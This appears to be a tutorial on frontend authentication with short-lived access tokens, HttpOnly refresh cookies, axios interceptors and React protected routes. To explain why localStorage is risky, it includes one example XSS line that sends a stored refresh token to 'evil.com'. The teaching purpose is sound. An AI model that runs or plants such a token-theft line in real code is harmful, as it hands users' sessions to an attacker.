## Short answer

1. **Login:** the server gives **2 tokens**.
   - **Access token** (~15 min): sent with **every API call**.
   - **Refresh token** (~7 days): used **only to get a new access token**.
2. **Protected route:** pages like "Create User" are only for logged-in users. Everyone else is sent to `/login`.
3. **Request interceptor:** **adds the access token** to every request automatically.
4. **Response interceptor:** on **401 (expired)**, it **refreshes the token and retries** the request. The user never notices.
5. **Refresh fails?** The user is logged out and sent to `/login`.

**Analogy: a hotel** 🏨

- **Access token** = your **room key card**. It opens every door, but **expires daily**.
- **Refresh token** = your **ID at reception**, which gets you a **new key card** without checking in again.
- **Interceptor** = a **porter** who swipes your card on every door and, if it fails, gets a new card from reception and opens the door for you.

**Setup used below:** the access token is kept **in memory**, and the refresh token is an **HttpOnly cookie** set by the server.

---

## Flow diagram

```
LOGIN
  Login page ── POST /auth/login ──▶ Server
             ◀── accessToken (body) + refreshToken (HttpOnly cookie)
  save accessToken in memory → setUser → go to /create-user

NORMAL REQUEST
  api.post('/users')
    → request interceptor adds  Authorization: Bearer <accessToken>
    → Server: 201 ✅

TOKEN EXPIRED
  api.post('/users') → 401 ❌
    → response interceptor → POST /auth/refresh (cookie sent automatically)
    → new accessToken → save → RETRY api.post('/users') → 201 ✅

PAGE REFRESH (F5)
  memory wiped → accessToken gone (cookie still there)
    → AuthProvider on start: POST /auth/refresh → new accessToken → logged in ✅
    → refresh fails → user = null → ProtectedRoute → /login
```

---

## 1. api.js

```js
import axios from 'axios'

let accessToken = null
export const setToken = (token) => (accessToken = token)

export const api = axios.create({
  baseURL: '/api',
  withCredentials: true, // send the refresh cookie
})

// 1. Add the token to every request
api.interceptors.request.use((config) => {
  if (accessToken) config.headers.Authorization = `Bearer ${accessToken}`
  return config
})

// 2. On 401 → refresh the token → retry once
api.interceptors.response.use(
  (res) => res,
  async (error) => {
    const original = error.config

    if (error.response?.status === 401 && !original._retry) {
      original._retry = true
      const { data } = await axios.post('/api/auth/refresh', {}, { withCredentials: true })
      setToken(data.accessToken)
      return api(original) // retry
    }

    return Promise.reject(error)
  }
)
```

**Key points:**

- **`return config`:** the request interceptor must return it, or the request never goes out.
- **`_retry`:** retry only **once**, so a request that keeps failing doesn't loop forever.
- **`axios.post` (not `api.post`) for the refresh:** so a failed refresh doesn't trigger this interceptor again.
- **`return api(original)`:** the component's `await` receives the **retried** response.

---

## 2. AuthContext.jsx

```jsx
import { createContext, useContext, useEffect, useState } from 'react'
import { api, setToken } from './api'

const AuthContext = createContext()

export function AuthProvider({ children }) {
  const [user, setUser] = useState(null)
  const [loading, setLoading] = useState(true)

  // After page refresh: get a new access token using the cookie
  useEffect(() => {
    api.post('/auth/refresh')
      .then(({ data }) => {
        setToken(data.accessToken)
        setUser(data.user)
      })
      .catch(() => setUser(null))
      .finally(() => setLoading(false))
  }, [])

  const login = async (email, password) => {
    const { data } = await api.post('/auth/login', { email, password })
    setToken(data.accessToken) // refresh token comes as a cookie
    setUser(data.user)
  }

  const logout = async () => {
    await api.post('/auth/logout')
    setToken(null)
    setUser(null)
  }

  return (
    <AuthContext.Provider value={{ user, loading, login, logout }}>
      {children}
    </AuthContext.Provider>
  )
}

export const useAuth = () => useContext(AuthContext)
```

---

## 3. ProtectedRoute.jsx

```jsx
import { Navigate, Outlet } from 'react-router-dom'
import { useAuth } from './AuthContext'

export function ProtectedRoute() {
  const { user, loading } = useAuth()

  if (loading) return <p>Loading...</p>
  if (!user) return <Navigate to="/login" replace />
  return <Outlet />
}
```

- **`loading` check:** after F5, `user` is `null` for a moment. Without it, the page would **jump to `/login`** before the session check finishes.
- **`<Outlet />`:** renders the protected child page.
- **`replace`:** the redirect doesn't add a history entry, so Back doesn't bounce the user around.

---

## 4. App.jsx

```jsx
import { BrowserRouter, Routes, Route } from 'react-router-dom'
import { AuthProvider } from './AuthContext'
import { ProtectedRoute } from './ProtectedRoute'
import Login from './Login'
import CreateUser from './CreateUser'

export default function App() {
  return (
    <BrowserRouter>
      <AuthProvider>
        <Routes>
          <Route path="/login" element={<Login />} />          {/* public */}

          <Route element={<ProtectedRoute />}>                  {/* protected */}
            <Route path="/create-user" element={<CreateUser />} />
          </Route>
        </Routes>
      </AuthProvider>
    </BrowserRouter>
  )
}
```

To add more private pages, put them **inside** `<Route element={<ProtectedRoute />}>`.

---

## 5. Login & CreateUser

```jsx
// Login.jsx
import { useState } from 'react'
import { useNavigate } from 'react-router-dom'
import { useAuth } from './AuthContext'

export default function Login() {
  const { login } = useAuth()
  const navigate = useNavigate()
  const [email, setEmail] = useState('')
  const [password, setPassword] = useState('')

  const handleSubmit = async (e) => {
    e.preventDefault()
    await login(email, password)
    navigate('/create-user')
  }

  return (
    <form onSubmit={handleSubmit}>
      <input value={email} onChange={(e) => setEmail(e.target.value)} />
      <input type="password" value={password} onChange={(e) => setPassword(e.target.value)} />
      <button>Login</button>
    </form>
  )
}
```

```jsx
// CreateUser.jsx
import { useState } from 'react'
import { api } from './api'

export default function CreateUser() {
  const [name, setName] = useState('')

  const handleSubmit = async (e) => {
    e.preventDefault()
    await api.post('/users', { name }) // token added automatically
    alert('User created')
  }

  return (
    <form onSubmit={handleSubmit}>
      <input value={name} onChange={(e) => setName(e.target.value)} />
      <button>Create</button>
    </form>
  )
}
```

**When the token has expired and you click "Create":**

```
1. api.post('/users')        → interceptor adds the old token
2. Server                    → 401
3. Response interceptor      → POST /auth/refresh → new token
4. Retry api.post('/users')  → 201 ✅
5. alert('User created')     (the component never saw the 401)
```

---

## Where to store tokens

| Token | Where | Why |
|---|---|---|
| **Access token** | **Memory** (a JS variable) | Not in storage, so it's hard to steal; lost on F5, which is fine |
| **Refresh token** | **`HttpOnly; Secure; SameSite` cookie**, set by the server | JavaScript **can't read it** |

**Why not `localStorage`?** Any script on the page can read it. One XSS bug and the attacker steals the tokens and uses them **from their own machine for days**:

```js
fetch('https://evil.com/steal?t=' + localStorage.getItem('refreshToken'))
```

Many apps still use `localStorage` because it's simple, but **memory + HttpOnly cookie** is the recommended setup. With cookies, protect against **CSRF** too, using `SameSite` and a POST-only refresh endpoint (see the XSS & CSRF question).

---

## After page refresh

**Memory is wiped on F5, so the access token is gone.** But the **cookie survives**:

1. **`AuthProvider` starts with `loading = true`**, and `ProtectedRoute` shows "Loading...".
2. **It calls `/auth/refresh`**, and the browser sends the cookie automatically.
3. **✅ The cookie is valid:** it gets a new access token and the user, and stays logged in.
4. **❌ The cookie is expired:** `user = null`, so `ProtectedRoute` redirects to `/login`.

**To the user, it's just a short loading spinner.**

---

## Axios basics

```js
const api = axios.create({
  baseURL: '/api',          // prefix for every URL
  timeout: 10000,           // fail after 10s
  withCredentials: true,    // send cookies
})

api.get('/users', { params: { page: 2 } })   // → /api/users?page=2
api.post('/users', { name: 'Sam' })          // 2nd argument = request body
api.put('/users/1', { name: 'Sam' })
api.delete('/users/1')
```

```js
try {
  const res = await api.get('/users')
  res.data        // ⭐ the JSON body (no .json() needed)
  res.status      // 200
} catch (error) {
  error.response?.status         // 404, 401, 500... (server replied)
  error.response?.data.message   // the server's error message
  // no error.response → network error / timeout
}
```

| | **axios** | **fetch** |
|---|---|---|
| JSON | ✅ automatic (`res.data`) | ❌ `await res.json()` |
| Throws on 404/500 | ✅ yes | ❌ no, check `res.ok` yourself |
| Interceptors | ✅ built in | ❌ write your own wrapper |
| Timeout | ✅ `timeout` option | ❌ use `AbortSignal.timeout()` |

---

## Quick Q&A

**Q: Why two tokens?**
The access token is short-lived, so if stolen it only works for minutes. The refresh token lasts longer, is only sent to one endpoint, and **the server can revoke it**.

**Q: What does the request interceptor do?**
It adds `Authorization: Bearer <token>` to every request, so components never handle tokens.

**Q: What does the response interceptor do?**
On 401, it refreshes the access token and retries the original request once.

**Q: Why `_retry`?**
So a request is retried only **once**. Without it, a request that keeps getting 401 would loop forever.

**Q: Many requests get 401 at the same time?**
Share **one refresh promise** so only one refresh call is made, and all requests retry after it.

**Q: Is ProtectedRoute enough for security?**
**No.** It only hides pages. Anyone can call the API directly, so **the backend must check the token on every request**.

**Q: What's in a JWT?**
`header.payload.signature`. The payload has the user ID and expiry (`exp`). It's **signed, not encrypted**, so never put secrets in it.

---

## 🎯 Interview answer

> "On login, the server returns a short-lived access token, which I keep in memory, and sets a long-lived refresh token as an HttpOnly cookie, so JavaScript can't read it. I create one axios instance with `withCredentials: true` and two interceptors. The request interceptor adds `Authorization: Bearer <token>` to every request. The response interceptor catches 401 errors, marks the request with `_retry` so it only retries once, calls the refresh endpoint with plain axios to avoid a loop, saves the new access token, and retries the original request, so the component never notices. In `App`, the login route is public, and private pages like 'Create User' are nested inside a `ProtectedRoute`, which shows a loader while the session is being checked and redirects to `/login` if there's no user. Because the access token is in memory, a page refresh clears it, so the `AuthProvider` calls the refresh endpoint on startup using the cookie to restore the session. And protected routes only control the UI: the backend must still validate the token on every request."
